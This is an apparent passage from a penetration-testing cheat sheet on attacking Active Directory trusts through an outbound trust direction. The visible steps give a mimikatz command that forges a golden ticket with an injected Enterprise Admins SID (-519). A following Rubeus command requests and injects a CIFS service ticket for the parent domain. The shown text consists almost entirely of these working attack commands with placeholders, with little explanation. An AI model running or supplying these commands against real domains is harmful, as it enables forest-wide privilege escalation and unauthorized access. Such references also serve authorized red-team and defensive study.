...
### Access Resources with Outbound Trust Direction

{{< tab set2 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### 1. Get Intermediate Trust Account Hash
...
#### 1. Get Current and Target Domain SID
...
#### 3. Generate a Golden Ticket with Extra SID

```console
# Append '-519' to target domain SID (Enterprise Admins Group)
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:<CURRENT_DOMAIN> /sid:<CURRENT_DOMAIN_SID> /rc4:<PARENT_HASH> /sids:<PARENT_DOMAIN_SID>-519 /ticket:C:\ProgramData\ticket.kirbi" "exit"
```
...
#### 4. Request a Service Ticket of Parent Domain

```console
.\rubeus.exe asktgs /service:cifs/<PARENT_DOMAIN> /domain:<PARENT_DOMAIN> /dc:<PARENT_DC> /ticket:C:\ProgramData\ticket.kirbi /outfile:C:\ProgramData\ticket_2.kirbi /nowrap /ptt
```
